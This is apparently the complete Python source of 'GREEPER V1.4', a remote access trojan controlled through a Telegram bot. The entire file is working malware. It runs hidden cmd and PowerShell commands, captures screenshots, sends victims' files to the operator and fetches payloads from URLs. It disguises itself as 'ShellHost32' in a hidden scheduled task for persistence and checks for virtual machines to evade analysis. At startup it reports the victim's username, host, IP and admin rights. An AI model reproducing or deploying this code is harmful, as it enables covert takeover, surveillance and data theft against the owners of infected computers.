#GREEPER V1.4

import os
import sys
import shutil
import time
import subprocess as sp
import telebot
import pyautogui
import ctypes

bot = telebot.TeleBot("YOUR_BOT_TOKEN")
user = "YOUR_USER_ID"

@bot.message_handler(commands=['screenshot'])
def screenshot(msg):
    if msg.from_user.id != int(user):
        bot.send_message(msg.chat.id, "You don't have permission!")
        return
    try:
        ss=pyautogui.screenshot()
        #Saves the screenshot to a temporary file with date and time as filename
        path=os.path.join(os.path.expandvars("%TEMP%"), time.strftime("%Y%m%d%H%M%S")+".png")
        ss.save(path)
        bot.send_photo(msg.chat.id, open(path, 'rb'))
        os.remove(path)
    except Exception as e:
        bot.send_message(msg.chat.id, "Error taking screenshot!"+str(e))

@bot.message_handler(commands=['upload'])
def upload(msg):
    if msg.from_user.id != int(user):
        bot.send_message(msg.chat.id, "You don't have permission!")
        return
    try:
        url = msg.text.partition(" ")[2]
        if url == "":
            bot.send_message(msg.chat.id, "Parameter required! Usage: /upload <URL> OR Send file to bot directly")
            return
        file_name = url.split("/")[-1]
        file_path = os.path.join(os.getcwd(), file_name)
        #Uses powershell to download file from the url in background (without requests module)
        sp.Popen(['powershell', '-command', f"Invoke-WebRequest -Uri '{url}' -OutFile '{file_path}'"], creationflags=sp.CREATE_NO_WINDOW)
        bot.send_message(msg.chat.id, f"File Uploaded to client successfully: {file_name}")
        bot.send_message(user, f"File saved to:\n{file_path}")
    except Exception as e:
        bot.send_message(msg.chat.id, f"Error uploading file: {str(e)}")  

@bot.message_handler(content_types=['document','video','photo'])
def upload_files(message):
    if message.from_user.id != int(user):
        bot.send_message(message.chat.id, "You don't have permission!")
        return
    try:
        #To download files from the user, we use the get_file method to get the file info and then download it
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        fname=message.document.file_name
        fpath=os.path.join(os.getcwd(), fname)
        with open(fpath, 'wb') as file:
            file.write(downloaded_file)
        bot.send_message(message.chat.id, f"File saved successfully: {fname}")
        bot.send_message(user, f"File saved to:\n{fpath}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error saving file: {str(e)}")

@bot.message_handler(commands=['download'])
def download(msg):
    if msg.from_user.id != int(user):
        bot.send_message(msg.chat.id, "You don't have permission!")
        return
    arguments = msg.text.split()
    if len(arguments) > 1:
        path = ' '.join(arguments[1:])
        try:
            bot.send_document(msg.chat.id, open(path, 'rb'))
        except Exception as e:
            bot.reply_to(msg, "Error while trying to download the file:\n" + str(e))
    else:
        bot.reply_to(msg, "Parameter required! Usage: download <path>")

@bot.message_handler(commands=['persistent'])
def persistent(msg):
    if msg.from_user.id != int(user):
        bot.send_message(msg.chat.id, "You don't have permission!")
        return
    paypath=os.path.expanduser("~")+"\\AppData\\Roaming\\Microsoft\\AddIns\\ShellHost32.exe"
    #It creates a scheduled task that runs the Greeper at every login from the above path
    persistent_cmd = f"""$taskName='ShellHost32';if(Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue){{Unregister-ScheduledTask -TaskName $taskName -Confirm:$false}};$action=New-ScheduledTaskAction -Execute '{paypath}';$trigger=New-ScheduledTaskTrigger -AtLogOn;$settings=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden -MultipleInstances Parallel;if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){{$principal=New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest}}else{{$principal=New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive}};Register-ScheduledTask -Action $action -Trigger $trigger -Principal $principal -TaskName $taskName -Settings $settings"""
    if os.path.isfile(paypath):
        bot.send_message(msg.chat.id, "Persistence already exists!")
    else:
        #if the Greeper exe is not present it copies to the path
        #shutil.copyfile(sys.executable, paypath)
        sp.Popen(['powershell', '-command', persistent_cmd], creationflags=sp.CREATE_NO_WINDOW)
        bot.send_message(user, "Persistence Added Sucessfully!")
        bot.send_message(user,"Greeper will run on every System boot!")

@bot.message_handler(commands=['uninstall'])
def uninstall(msg):
    if msg.from_user.id != int(user):
        bot.send_message(msg.chat.id, "You don't have permission!")
        return
    #removes the scheduled task and deleted the exe from the saved path
    paypath=os.path.expanduser("~")+"\\AppData\\Roaming\\Microsoft\\AddIns\\ShellHost32.exe"
    uns_cmd=f"""$taskName='ShellHost32';if(Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue){{Unregister-ScheduledTask -TaskName $taskName -Confirm:$false}}"""
    if os.path.isfile(paypath):
        sp.Popen(['powershell', '-command', uns_cmd], creationflags=sp.CREATE_NO_WINDOW)
        try:
            os.remove(paypath)
        except:
            try:
                sp.Popen(['powershell', '-command', 'Remove-Item -Path "' + paypath + '" -Force'], creationflags=sp.CREATE_NO_WINDOW)
            except Exception as e:
                bot.send_message(msg.chat.id, "Error while removing persistence!\n\n" + str(e))
                print(e)
                return

        bot.send_message(msg.chat.id, "Persistence Uninstalled Successfully!")
    else:
        bot.send_message(msg.chat.id, "Persistence not found!")

@bot.message_handler(commands=["cmd"])
def cmd(msg):
    if msg.from_user.id == int(user):
        cmd = msg.text.partition(" ")[2]
        if cmd != "":
            try:
                if cmd.startswith("cd"):
                    cmd = cmd.partition(" ")[2]
                    if cmd == "":
                        bot.send_message(msg.chat.id, os.getcwd())
                    else:
                        os.chdir(cmd)
                        bot.send_message(msg.chat.id, os.getcwd())
                else:
                    result = sp.Popen(cmd, stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True,text=True, creationflags=sp.CREATE_NO_WINDOW)
                    out, err = result.communicate()
                    result.wait()
                    if not err:
                        if out: bot.send_message(msg.chat.id, out)
                        else: bot.send_message(msg.chat.id, "Command executed sucessfully without Output!")
                    else:
                        bot.send_message(msg.chat.id, err)
            except Exception as e:
                bot.send_message(msg.chat.id, "Some error occured!\n\n"+str(e))
        else:
            bot.send_message(msg.chat.id, "Parameter required!")
    else:
        bot.send_message(msg.chat.id, "You don't have permission!")

@bot.message_handler(commands=['terminate'])
def terminate(message):
    if message.from_user.id != int(user):
        bot.send_message(message.chat.id, "You don't have permission!")
        #return
    bot.send_message(user,"Greeper Terminated!")
    global end
    end=True
    bot.stop_polling()
    sys.exit()

@bot.message_handler(commands=['msg'])
def msg(message):
    if message.from_user.id != int(user):
        bot.send_message(message.chat.id, "You don't have permission!")
        return
    message_content = ' '.join(message.text.split()[1:]).replace("'", "''")
    if message_content == "":
        bot.reply_to(message,"Empty Message!")
        return
    #Powershell script to display a bit modern looking message box
    ps_script = f"""
    Add-Type -AssemblyName System.Windows.Forms;
    Add-Type -AssemblyName System.Drawing;
    $form = New-Object System.Windows.Forms.Form;
    $form.Text = "MSG from Greeper";
    $form.TopMost = $true;
    $form.AutoSize = $true;
    $form.AutoSizeMode = [System.Windows.Forms.AutoSizeMode]::GrowAndShrink;
    $form.StartPosition = [System.Windows.Forms.FormStartPosition]::CenterScreen;
    $label = New-Object System.Windows.Forms.Label;
    $label.Text = '{message_content}';
    $label.AutoSize = $true;
    $label.MaximumSize = New-Object System.Drawing.Size(400, 0);  # Wider maximum width
    $label.Font = New-Object System.Drawing.Font('Microsoft Sans Serif', 12, [System.Drawing.FontStyle]::Regular);
    $label.Location = New-Object System.Drawing.Point(20, 20);
    $button = New-Object System.Windows.Forms.Button;
    $button.Text = "OK";
    $button.Font = New-Object System.Drawing.Font('Microsoft Sans Serif', 12, [System.Drawing.FontStyle]::Regular);
    $button.Size = New-Object System.Drawing.Size(100, 40);
    $button.Location = New-Object System.Drawing.Point(150, 80);
    $button.Add_Click({{ $form.Close() }});
    $form.Controls.Add($label);
    $form.Controls.Add($button);
    [void] $form.ShowDialog();
    """
    sp.Popen(['powershell', '-command', ps_script],creationflags=sp.CREATE_NO_WINDOW)
    bot.reply_to(message,"Message box displayed sucessfully")

@bot.message_handler(commands=['help'])
def help(message):
    bot.reply_to(message,"""
Commands:
                 
1. /cmd <command> - Execute cmd/ps commands
2. /screenshot - Takes a screenshot and sends it
3. /msg <message to display> - displays msg box
4. /upload <URL> - Uploads file from URL
   You can also send file to bot directly
5. /download <path> - Downloads file from client
6. /persistent - Auto starts Greeper on Boot!
7. /uninstall - Uninstalls persistence
8. /terminate - Terminate current session
9. /help - Displays this message
                 
Replace <> with parameters
Ex: /cmd dir
""")

def startup():
    #To send the forst startup messages
    try:
        url="https://i.postimg.cc/Jz8D6Fgp/GREEPER.png"
        file_path=os.path.join(os.path.expandvars("%TEMP%"), "Greeper.png")
        sp.Popen(['powershell', '-command', f"Invoke-WebRequest -Uri '{url}' -OutFile '{file_path}'"], creationflags=sp.CREATE_NO_WINDOW)
        bot.send_photo(user, open(file_path, 'rb'))
    except Exception as e:
        bot.send_message(user,"Error sending startup image!"+str(e))
        bot.send_message(user,"Greeper is online!")
    try: admin=ctypes.windll.shell32.IsUserAnAdmin() != 0
    except: admin="Undefined"
    try: username=os.getlogin()
    except: username="Undefined"
    try: host=os.environ['COMPUTERNAME']
    except: host="Undefined"
    try:
        rules = ['Virtualbox', 'vmbox', 'vmware']
        command = sp.Popen("SYSTEMINFO | findstr  \"System Info\"", stderr=sp.PIPE,
                           stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True,
                           creationflags=0x08000000)
        out, err = command.communicate()
        command.wait()
        for rule in rules:
            if rule.lower() in out.lower():
                vm=True
                break
            else:
                vm=False
    except Exception as e:
        vm="Undefined"
    try:
        output = sp.Popen(['powershell', '-Command', '(Invoke-WebRequest -Uri https://ipv4.myip.wtf/text).Content'], stdout=sp.PIPE, stderr=sp.PIPE, shell=True)
        IP = output.communicate()[0].decode().strip()
    except Exception: IP = "None"

    bot.send_message(user, f"""
GREEPER BY G!R!

Agent Online at {time.strftime('%Y-%m-%d %H:%M:%S')}
Username: {username}
Host: {host}
IP: {IP}
Admin: {admin}
VM: {vm}

Send /help to see commands.
""")

startup()
end=False
while not end:
    try:
        bot.polling(none_stop=True, timeout=60)
        print("Greeper is running!")
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(5)
